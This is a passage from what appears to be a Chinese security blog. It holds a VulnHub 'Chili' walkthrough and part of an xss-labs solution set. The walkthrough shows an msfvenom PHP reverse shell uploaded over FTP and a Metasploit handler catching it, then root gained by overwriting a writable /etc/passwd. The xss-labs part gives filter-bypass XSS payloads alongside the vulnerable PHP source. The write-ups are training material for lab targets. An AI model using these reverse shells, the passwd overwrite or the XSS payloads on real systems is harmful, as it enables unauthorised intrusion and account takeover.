<p>ftp&gt; cd var&#x2F;www&#x2F;html<br>250 Directory successfully changed.<br>ftp&gt; ls -la<br>229 Entering Extended Passive Mode (|||5328|)<br>150 Here comes the directory listing.<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 .<br>drwxr-xr-x    3 0        0            4096 Sep 08  2020 ..<br>drwxrwxrwx    2 0        0            4096 Sep 08  2020 .nano<br>drwxr-xr-x    2 0        0            4096 Sep 08  2020 .vim<br>-rw-r–r–    1 0        0           74290 Oct 23  2018 Chile_WEB.jpg<br>-rw-r–r–    1 0        0             657 Sep 08  2020 index.html</p>
</blockquote>
<p>根据常识</p>
<blockquote>
<ul>
<li><code>d</code> 表示文件夹（目录）</li>
<li><code>r</code> 表示具有读取权限</li>
<li><code>w</code> 表示具有写入权限</li>
<li><code>x</code> 表示具有执行权限</li>
<li><code>-</code> 表示没有相应的权限</li>
</ul>
</blockquote>
<p> <strong>.nano是一个文件夹，且用户对该目录有读写权限</strong></p>
<p>考虑上传木马</p>
<h3 id="5-上传木马"><a href="#5-上传木马" class="headerlink" title="5.上传木马"></a>5.上传木马</h3><blockquote>
<p>└─# msfvenom -p php&#x2F;meterpreter_reverse_tcp LHOST&#x3D;<strong>kali的ip</strong> LPORT&#x3D;4444 -f raw  &gt; shell.php<br>[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload<br>[-] No arch selected, selecting arch: php from the payload<br>No encoder specified, outputting raw payload<br>Payload size: 34852 bytes</p>
</blockquote>
<blockquote>
<p>ftp&gt; cd .nano   &#x2F;&#x2F;切换进文件夹<br>250 Directory successfully changed.<br>ftp&gt; ls -la<br>229 Entering Extended Passive Mode (|||36678|)<br>150 Here comes the directory listing.<br>drwxrwxrwx    2 0        0            4096 Sep 08  2020 .<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 ..<br>-rw-r–r–    1 1000     1000            0 Sep 08  2020 index.html<br>226 Directory send OK.</p>
</blockquote>
<blockquote>
<p>ftp&gt; put shell.php  &#x2F;&#x2F;放置木马<br>local: shell.php remote: shell.php<br>229 Entering Extended Passive Mode (|||14637|)<br>150 Ok to send data.<br>100% |********************************| 34852       15.08 MiB&#x2F;s    00:00 ETA<br>226 Transfer complete.<br>34852 bytes sent in 00:00 (5.13 MiB&#x2F;s)<br>ftp&gt; ls -la<br>229 Entering Extended Passive Mode (|||41969|)<br>150 Here comes the directory listing.<br>drwxrwxrwx    2 0        0            4096 Jun 20 09:58 .<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 ..<br>-rw-r–r–    1 1000     1000            0 Sep 08  2020 index.html<br>-rw——-    1 1000     1000        34852 Jun 20 09:58 shell.php  &#x2F;&#x2F;上传成功<br>226 Directory send OK.</p>
</blockquote>
<blockquote>
<p>ftp&gt; chmod 777 shell.php   &#x2F;&#x2F;改权限<br>200 SITE CHMOD command ok.<br>ftp&gt; ls -la<br>229 Entering Extended Passive Mode (|||26075|)<br>150 Here comes the directory listing.<br>drwxrwxrwx    2 0        0            4096 Jun 20 09:58 .<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 ..<br>-rw-r–r–    1 1000     1000            0 Sep 08  2020 index.html<br>-rwxrwxrwx    1 1000     1000        34852 Jun 20 09:58 shell.php</p>
</blockquote>
<h3 id="6-msf反弹shell"><a href="#6-msf反弹shell" class="headerlink" title="6.msf反弹shell"></a>6.msf反弹shell</h3><p>监听端口。</p>
<blockquote>
<p>msf6 &gt; use exploit&#x2F;multi&#x2F;handler<br>[*] Using configured payload generic&#x2F;shell_reverse_tcp<br>msf6 exploit(multi&#x2F;handler) &gt; set patload php&#x2F;meterpreter_reverse_tcp<br>[-] Unknown datastore option: patload. Did you mean PAYLOAD?<br>msf6 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter_reverse_tcp<br>payload &#x3D;&gt; php&#x2F;meterpreter_reverse_tcp<br>msf6 exploit(multi&#x2F;handler) &gt; set lhost 192.168.1.4<br>lhost &#x3D;&gt; 192.168.1.4<br>msf6 exploit(multi&#x2F;handler) &gt; exploit</p>
<p>[-] Handler failed to bind to 192.168.1.4:4444:-  -<br>[*] Started reverse TCP handler on 0.0.0.0:4444 </p>
</blockquote>
<p><code>use exploit/multi/handler</code>用于创建一个多功能的处理器，用于<strong>接收和处理</strong>来自<strong>漏洞利用的连接</strong>。</p>
<p>使用 <code>use exploit/multi/handler</code> 命令后，可以设置一些参数，例如<strong>监听的IP地址、监听的端口、Payload（有效载荷）</strong>等。这样设置后，当成功利用一个漏洞并建立起连接时，多功能处理器将接收到连接并执行预定义的操作，例如获取 shell 或者执行其他命令。</p>
<p>然后浏览器访问<a href="http://192.168.1.4/.nano/shell.php">http://192.168.1.4/.nano/shell.php</a></p>
<blockquote>
<p>meterpreter &gt; getuid<br>Server username: www-data  监听到了。</p>
</blockquote>
<p>当然了 nc也行 <code>nc -lvnp 4444</code></p>
<blockquote>
<p>起一个 nc 监听，访问 <code>http://192.168.1.4/.nano/php-reverse-shell.php</code>，成功接收到反弹的 shell，并执行命令 <code>SHELL=/bin/bash script -q /dev/null</code> 获得一个交互式 shell</p>
</blockquote>
<p>我试了不行诶。</p>
<p> 遇到反弹后不是正常的shell，可用命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>

<p>转化为常规的shell。</p>
<h3 id="7-提权"><a href="#7-提权" class="headerlink" title="7.提权"></a>7.提权</h3><p>查找用户可读可写、可执行文件、SUID文件</p>
<p>&#x2F;etc&#x2F;passwd可写，可以写入具有root权限的用户</p>
<blockquote>
<p>工具 enumy64：是一款linux后渗透提权枚举工具，是一个快速的可移植、可执行文件 <a href="https://github.com/luke-goddard/enumy/releases">Releases · luke-goddard&#x2F;enumy (github.com)</a></p>
</blockquote>
<p>上传该工具</p>
<blockquote>
<p>ftp&gt; put enumy64<br>local: enumy64 remote: enumy64<br>229 Entering Extended Passive Mode (|||47003|)<br>150 Ok to send data.<br>100% |********************************|   986 KiB   28.25 MiB&#x2F;s    00:00 ETA<br>226 Transfer complete.<br>1010192 bytes sent in 00:00 (26.89 MiB&#x2F;s)<br>ftp&gt; chmod 777 enumy64    &#x2F;&#x2F;更改工具权限<br>200 SITE CHMOD command ok.<br>ftp&gt; ls -la<br>229 Entering Extended Passive Mode (|||28394|)<br>150 Here comes the directory listing.<br>drwxrwxrwx    2 0        0            4096 Jun 20 10:19 .<br>drwxr-xr-x    4 0        0            4096 Sep 08  2020 ..<br>-rwxrwxrwx    1 1000     1000      1010192 Jun 20 10:19 enumy64<br>-rw-r–r–    1 1000     1000            0 Sep 08  2020 index.html<br>-rwxrwxrwx    1 1000     1000        34852 Jun 20 09:58 shell.php<br>226 Directory send OK.</p>
</blockquote>
<p><strong>在监听窗口处执行脚本</strong></p>
<blockquote>
<h1 id="meterpreter-gt-ls-laListing-x2F-var-x2F-www-x2F-html-x2F-nano"><a href="#meterpreter-gt-ls-laListing-x2F-var-x2F-www-x2F-html-x2F-nano" class="headerlink" title="meterpreter &gt; ls -laListing: &#x2F;var&#x2F;www&#x2F;html&#x2F;.nano"></a>meterpreter &gt; ls -la<br>Listing: &#x2F;var&#x2F;www&#x2F;html&#x2F;.nano</h1><p>Mode              Size     Type  Last modified              Name</p>
<hr>
<p>100777&#x2F;rwxrwxrwx  1010192  fil   2023-06-20 22:19:53 +0800  enumy64<br>100644&#x2F;rw-r–r–  0        fil   2020-09-09 01:14:15 +0800  index.html<br>100777&#x2F;rwxrwxrwx  34852    fil   2023-06-20 21:58:11 +0800  shell.php</p>
<p>meterpreter &gt; .&#x2F;enumy64<br>[-] Unknown command: .&#x2F;enumy64<br>meterpreter &gt; <strong>shell</strong><br>Process 1147 created.<br>Channel 0 created.<br><strong>pwd</strong><br>&#x2F;var&#x2F;www&#x2F;html&#x2F;.nano<br><strong>.&#x2F;enumy64</strong></p>
</blockquote>
<blockquote>
<p>Current User Info    uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)<br>Version              Linux version 4.19.0-10-amd64 (<a href="mailto:&#100;&#x65;&#x62;&#105;&#97;&#110;&#45;&#x6b;&#x65;&#114;&#x6e;&#x65;&#x6c;&#x40;&#x6c;&#x69;&#x73;&#116;&#115;&#46;&#x64;&#x65;&#98;&#x69;&#x61;&#110;&#x2e;&#111;&#114;&#x67;">&#100;&#x65;&#x62;&#105;&#97;&#110;&#45;&#x6b;&#x65;&#114;&#x6e;&#x65;&#x6c;&#x40;&#x6c;&#x69;&#x73;&#116;&#115;&#46;&#x64;&#x65;&#98;&#x69;&#x61;&#110;&#x2e;&#111;&#114;&#x67;</a>) (gcc version 8.3.0 (Debian 8.3.0-6)) #1 SMP Debian 4.19.132-1 (2020-07-24)<br>hostname             chili<br>Umask                u&#x3D;rwx,g&#x3D;rx,o&#x3D;rx</p>
<h2 id="Last-Login"><a href="#Last-Login" class="headerlink" title="Last Login"></a>Last Login</h2><p>Username         Port     From             Latest<br>root             tty1                      Tue Sep  8 13:11:53 -0400 2020<br>chili            tty1                      Tue Sep  8 13:12:50 -0400 2020</p>
<h2 id="User-Accounts"><a href="#User-Accounts" class="headerlink" title="User Accounts"></a>User Accounts</h2><p>root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash<br>sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync<br>chili:x:1000:1000:chili,,,:&#x2F;home&#x2F;chili:&#x2F;bin&#x2F;bash</p>
<h2 id="Who-Else-Is-Logged-On"><a href="#Who-Else-Is-Logged-On" class="headerlink" title="Who Else Is Logged On"></a>Who Else Is Logged On</h2><p> 10:22:42 up  1:42,  0 users,  load average: 0.00, 0.00, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</p>
<h2 id="Groups"><a href="#Groups" class="headerlink" title="Groups"></a>Groups</h2><p>uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)<br>uid&#x3D;1(daemon) gid&#x3D;1(daemon) groups&#x3D;1(daemon)<br>uid&#x3D;2(bin) gid&#x3D;2(bin) groups&#x3D;2(bin)<br>uid&#x3D;3(sys) gid&#x3D;3(sys) groups&#x3D;3(sys)<br>uid&#x3D;4(sync) gid&#x3D;65534(nogroup) groups&#x3D;65534(nogroup)<br>uid&#x3D;5(games) gid&#x3D;60(games) groups&#x3D;60(games)<br>uid&#x3D;6(man) gid&#x3D;12(man) groups&#x3D;12(man)<br>uid&#x3D;7(lp) gid&#x3D;7(lp) groups&#x3D;7(lp)<br>uid&#x3D;8(mail) gid&#x3D;8(mail) groups&#x3D;8(mail)<br>uid&#x3D;9(news) gid&#x3D;9(news) groups&#x3D;9(news)<br>uid&#x3D;10(uucp) gid&#x3D;10(uucp) groups&#x3D;10(uucp)<br>uid&#x3D;13(proxy) gid&#x3D;13(proxy) groups&#x3D;13(proxy)<br>uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data)<br>uid&#x3D;34(backup) gid&#x3D;34(backup) groups&#x3D;34(backup)<br>uid&#x3D;38(list) gid&#x3D;38(list) groups&#x3D;38(list)<br>uid&#x3D;39(irc) gid&#x3D;39(irc) groups&#x3D;39(irc)<br>uid&#x3D;41(gnats) gid&#x3D;41(gnats) groups&#x3D;41(gnats)<br>uid&#x3D;65534(nobody) gid&#x3D;65534(nogroup) groups&#x3D;65534(nogroup)<br>uid&#x3D;100(_apt) gid&#x3D;65534(nogroup) groups&#x3D;65534(nogroup)<br>uid&#x3D;101(systemd-timesync) gid&#x3D;102(systemd-timesync) groups&#x3D;102(systemd-timesync)<br>uid&#x3D;102(systemd-network) gid&#x3D;103(systemd-network) groups&#x3D;103(systemd-network)<br>uid&#x3D;103(systemd-resolve) gid&#x3D;104(systemd-resolve) groups&#x3D;104(systemd-resolve)<br>uid&#x3D;1000(chili) gid&#x3D;1000(chili) groups&#x3D;1000(chili),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)<br>uid&#x3D;999(systemd-coredump) gid&#x3D;999(systemd-coredump) groups&#x3D;999(systemd-coredump)<br>uid&#x3D;104(messagebus) gid&#x3D;110(messagebus) groups&#x3D;110(messagebus)<br>uid&#x3D;105(sshd) gid&#x3D;65534(nogroup) groups&#x3D;65534(nogroup)<br>uid&#x3D;106(ftp) gid&#x3D;113(ftp) groups&#x3D;113(ftp)</p>
<p>Severity: MEDIUM  Name: sysctl ptrace is configured insecurly                                           -rw-r–r– 1 root root 0 Jun 20 10:22 &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;yama&#x2F;ptrace_scope<br><strong>Severity: INFO    Name: Found an new root user with UID 0: root</strong>                                         <strong>-rw-r–rw- 1</strong> root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Severity: INFO    Name: Found an new root user with GID 0: root                                         -rw-r–rw- 1 root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Severity: INFO    Name: Found an new user that can be logged into: root                                 -rw-r–rw- 1 root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Severity: INFO    Name: Found an new user that can be logged into: sync                                 -rw-r–rw- 1 root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: INFO    Name: Found an new user that can be logged into: chili                                -rw-r–rw- 1 root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Found a home directory that does not exist, but is attached to an existing user<br>Severity: HIGH    Name: Low entropy file that could be a private key                                    -rw-r–r– 1 root root 20661 Feb 11  2019 &#x2F;usr&#x2F;share&#x2F;X11&#x2F;xkb&#x2F;symbols&#x2F;pk<br>Severity: INFO    Name: Config file could contain passwords                                             -rw-r–r– 1 root root 494 Feb 10  2019 &#x2F;usr&#x2F;share&#x2F;libc-bin&#x2F;nsswitch.conf<br>Severity: MEDIUM  Name: Executable capable of spawning reverse shells found                             -rwxr-xr-x 1 root root 1168776 Apr 18  2019 &#x2F;usr&#x2F;bin&#x2F;bash<br>Severity: MEDIUM  Name: Executable capable of spawning reverse shells found                             -rwxr-xr-x 1 root root 736776 Apr 20  2020 &#x2F;usr&#x2F;bin&#x2F;openssl<br>Severity: MEDIUM  Name: Executable capable of spawning reverse shells found                             -rwxr-xr-x 2 root root 3201864 Jul 21  2020 &#x2F;usr&#x2F;bin&#x2F;perl<br>Severity: HIGH    Name: CAP_NET_RAW capablities enabled on file                                         -rwxr-xr-x 1 root root 69368 Jan 13  2020 &#x2F;usr&#x2F;bin&#x2F;ping<br>Severity: MEDIUM  Name: Executable capable of spawning reverse shells found                             -rwxr-xr-x 1 root root 8156 Jul 21  2020 &#x2F;usr&#x2F;bin&#x2F;cpan<br>Severity: MEDIUM  Name: Abnormal GUID enabled executable found                                          -rwxr-sr-x 1 root crontab 43568 Oct 11  2019 &#x2F;usr&#x2F;bin&#x2F;crontab<br>Severity: MEDIUM  Name: Abnormal GUID enabled executable found                                          -rwxr-sr-x 1 root tty 14736 May  4  2018 &#x2F;usr&#x2F;bin&#x2F;bsd-write<br>Severity: MEDIUM  Name: Abnormal SUID enabled executable found                                          -rwsr-xr-x 1 root root 10232 Mar 28  2017 &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device<br>Severity: INFO    Name: Config file could contain passwords                                             -rw-r–r– 1 root root 239 Sep 27  2017 &#x2F;usr&#x2F;lib&#x2F;tmpfiles.d&#x2F;passwd.conf<br>Severity: MEDIUM  Name: Found backup &#x2F;etc&#x2F;shadow file                                                   -rw-r—– 1 root shadow 965 Sep  8  2020 &#x2F;etc&#x2F;shadow-<br>Severity: INFO    Name: Found backup &#x2F;etc&#x2F;passwd file                                                   -rw-r–r– 1 root root 1437 Sep  8  2020 &#x2F;etc&#x2F;passwd-<br>Severity: INFO    Name: Config file could contain passwords                                             -rw-r–r– 1 root root 494 Feb 10  2019 &#x2F;etc&#x2F;nsswitch.conf<br>Severity: INFO    Name: Config file could contain passwords                                             -rw-r–r– 1 root root 5849 Sep  8  2020 &#x2F;etc&#x2F;vsftpd.conf<br>Severity: MEDIUM  Name: Other permissions are higher than Group permissions                             -rw-r–rw- 1 root root 1450 Sep  8  2020 &#x2F;etc&#x2F;passwd<br>Generating JSON<br>Json saved at location -&gt; enumy.json<br>Total files scanned -&gt; 25176</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230620222925066.png"></p>
<p>发现，对&#x2F;etc&#x2F;passwd有写的权限</p>
<h4 id="添加一个高权限用户"><a href="#添加一个高权限用户" class="headerlink" title="添加一个高权限用户"></a>添加一个高权限用户</h4><p>使用perl编译密码</p>
<blockquote>
<p>┌──(root㉿kali)-[~]<br>└─# &#x2F;usr&#x2F;bin&#x2F;perl -le ‘print crypt(“test”,”test”)’<br>teH0wLIpW0gyQ</p>
</blockquote>
<p><strong>在监听端口的shell中</strong></p>
<blockquote>
<p>Terminate channel 0? [y&#x2F;N]  y<br>meterpreter &gt; shell<br>Process 1249 created.<br>Channel 1 created.<br><strong>echo “test:teH0wLIpW0gyQ:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash” &gt; &#x2F;etc&#x2F;passwd</strong><br>&#x2F;&#x2F;test:teH0wLIpW0gyQ:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash这种格式是遵循 <code>/etc/passwd</code> 文件的格式。每个字段用冒号（<code>:</code>）分隔，表示不同的用户属性。按顺序，这些字段包括用户名、密码（在此示例中使用了一个哈希值）、用户ID、组ID、用户描述、主目录和默认的登录Shell。</p>
</blockquote>
<blockquote>
<p>Terminate channel 1? [y&#x2F;N]  y<br>meterpreter &gt; shell<br>Process 1251 created.<br>Channel 2 created.<br>su test<br>Password: test<br>ls &#x2F;root<br>proof.txt<br>cat &#x2F;root&#x2F;proof.txt<br>Sun_CSR.Chili.af6d45da1f1181347b9e2139f23c6a5b</p>
</blockquote>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>主机发现-&gt;端口扫描-&gt;版本、系统信息</p>
<p>网页f12的敏感数据，ftp的密码爆破</p>
<p>msfvenom，是一个可以生成后门木马的框架，在目标机上执行，本地监听上线。</p>
<p>enumy64是一个linux后渗透提权枚举工具，一个快速的可移植可执行文件</p>
<p>写入&#x2F;etc&#x2F;passwd中的密码时需要将写入的密码首先进行perl编码</p>
<p>[VulnHub靶场系列：Chili_chili靶场_快吃小蛋糕吧的博客-CSDN博客](<a href="https://blog.csdn.net/qq_40549070/article/details/108926099?ops_request_misc=%7B%22request_id%22:%22168726603016800213067085%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=168726603016800213067085&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-108926099-null-null.142%5Ev88%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=vulnhub">https://blog.csdn.net/qq_40549070/article/details/108926099?ops_request_misc=%7B%22request%5Fid%22%3A%22168726603016800213067085%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=168726603016800213067085&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~hot_rank-1-108926099-null-null.142^v88^control_2,239^v2^insert_chatgpt&amp;utm_term=vulnhub</a> chili&amp;spm&#x3D;1018.2226.3001.4187)</p>
<h2 id="2、tiki"><a href="#2、tiki" class="headerlink" title="2、tiki"></a>2、tiki</h2>]]></content>
      <categories>
        <category>渗透测试</category>
        <category>vulnhub</category>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>xss-labs</title>
    <url>/2023/05/17/xss-labs/</url>
    <content><![CDATA[<h2 id="一、环境"><a href="#一、环境" class="headerlink" title="一、环境"></a>一、环境</h2><p>phpstudy</p>
<h2 id="二、内容"><a href="#二、内容" class="headerlink" title="二、内容"></a>二、内容</h2><h3 id="1-level1"><a href="#1-level1" class="headerlink" title="1.level1"></a>1.level1</h3><p>url中添加</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(&quot;11&quot;)&lt;/script&gt;即可</span><br></pre></td></tr></table></figure>

<h3 id="2-level2-html实体化-lt-gt"><a href="#2-level2-html实体化-lt-gt" class="headerlink" title="2.level2(html实体化&lt;&gt;)"></a>2.level2(html实体化&lt;&gt;)</h3><p>输入level1中的值，发现&lt;&gt;被实体化了。</p>
<p>构造input闭合</p>
<p><code>&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></p>
<h3 id="3-level3-html实体化”-lt-gt"><a href="#3-level3-html实体化”-lt-gt" class="headerlink" title="3.level3(html实体化”&lt;&gt;)"></a>3.level3(html实体化”&lt;&gt;)</h3><p>经过试验单引号不会被转义</p>
<p>构造onmouseover事件，即鼠标触碰到input标签即还行该事件</p>
<p><code>&#39; onmouseover=javascript:alert(1) &#39;</code></p>
<h3 id="4-level4-html实体化’-lt-gt"><a href="#4-level4-html实体化’-lt-gt" class="headerlink" title="4.level4(html实体化’&lt;&gt;)"></a>4.level4(html实体化’&lt;&gt;)</h3><p>很好，单引号、尖括号没了</p>
<p><code>&quot; onmouseover=javascript:alert(1) &quot;</code></p>
<h3 id="5-level5-伪协议"><a href="#5-level5-伪协议" class="headerlink" title="5.level5(伪协议)"></a>5.level5(伪协议)</h3><p>script、onmouserover等中间会加个_符号</p>
<p>知识点：伪协议：在url中调用js方法，如Data伪协议与Javascript协议</p>
<p><code>&quot;&gt;&lt;a href=javascript:alert(&quot;123&quot;)&gt;&quot;</code></p>
<p>点击链接跳转即可</p>
<p>参考：<a href="https://blog.csdn.net/qq_33181292/article/details/117251090?ops_request_misc=&request_id=&biz_id=102&utm_term=xss%E4%BC%AA%E5%8D%8F%E8%AE%AE&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-117251090.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&spm=1018.2226.3001.4187">XSS_伪协议与编码绕过_伪协议绕过_南部余额的博客-CSDN博客</a></p>
<p>​		<a href="https://blog.csdn.net/K_ShenH/article/details/122765092?ops_request_misc=%7B%22request_id%22:%22168440472216800197061493%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=168440472216800197061493&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-122765092-null-null.142%5Ev87%5Econtrol_2,239%5Ev2%5Einsert_chatgpt&utm_term=xss-labs&spm=1018.2226.3001.4187">xss-labs搭建及通关攻略_Lydia_Ha的博客-CSDN博客</a></p>
<h3 id="6-level6-小写过滤"><a href="#6-level6-小写过滤" class="headerlink" title="6.level6(小写过滤)"></a>6.level6(小写过滤)</h3><p>在script的基础上，href、src、oneerror什么的中间也加符号了</p>
<p>但没有大写过滤</p>
<p><code>&quot;&gt;&lt;SCRIPT&gt;alert(1)&lt;/SCRIPT&gt;</code></p>
<h3 id="7-level7-标签名过滤"><a href="#7-level7-标签名过滤" class="headerlink" title="7.level7(标签名过滤)"></a>7.level7(标签名过滤)</h3><p>src啊,&lt;&gt;script啊都被删了、on啊</p>
<p>双写绕过</p>
<p><code>&quot;&gt;&lt;SCRscriptIPT&gt;alert(1)&lt;/SCRscriptIPT&gt;</code></p>
<h3 id="8-level8-unicode编码"><a href="#8-level8-unicode编码" class="headerlink" title="8.level8(unicode编码)"></a>8.level8(unicode编码)</h3><p>它把输入框的值放在了a标签的href里</p>
<p>scr字符后面会放_符号，且大写会被转化为小写</p>
<p>引号也实体化了</p>
<p>将代码进行unicode编码即可</p>
<p>如<code>javascript:alert(1)</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</span><br></pre></td></tr></table></figure>

<p><a href="https://www.matools.com/code-convert-unicode">在线Unicode编码解码 - 码工具 (matools.com)</a></p>
<h3 id="level9-继续过滤"><a href="#level9-继续过滤" class="headerlink" title="level9(继续过滤)"></a>level9(继续过滤)</h3><p>还是把输入框的值放在了a标签的href里，但是unicode编码不能用咯</p>
<p>知识点:strpos()查找字符串在另一字符串中第一次出现的位置。</p>
<p>源码有strpos函数过滤，限制输入内容必须有http:&#x2F;&#x2F;</p>
<p><code>javas&amp;#99;ript:alert(&#39;http://123&#39;)</code></p>
<p>部分源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7=str_replace(&#x27;&quot;&#x27;,&#x27;&amp;quot&#x27;,$str6);</span><br><span class="line">echo &#x27;&lt;center&gt;</span><br><span class="line">&lt;form action=level9.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&#x27;.htmlspecialchars($str).&#x27;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&#x27;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(false===strpos($str7,&#x27;http://&#x27;))</span><br><span class="line">&#123;</span><br><span class="line">  echo &#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h3 id="level10-隐藏参数"><a href="#level10-隐藏参数" class="headerlink" title="level10(隐藏参数)"></a>level10(隐藏参数)</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str11 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.$str33.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>url被符号实体化了。</p>
<p>从t_sort输入框下手，仅仅替换了尖括号。</p>
<p>给input加一个onclick事件</p>
<p>如<code>onclick=alert(1)</code></p>
<p>记得去掉type的hide属性</p>
<h3 id="level11-Referer"><a href="#level11-Referer" class="headerlink" title="level11(Referer)"></a>level11(Referer)</h3><p>同level10</p>
<p>但是应该不对，怎么会有同一种解法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">$str00 = $_GET[&quot;t_sort&quot;];</span><br><span class="line">$str11=$_SERVER[&#x27;HTTP_REFERER&#x27;];</span><br><span class="line">$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);</span><br><span class="line">$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#x27;&lt;center&gt;</span><br><span class="line">&lt;form id=search&gt;</span><br><span class="line">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;.&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="line">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;.htmlspecialchars($str00).&#x27;&quot; 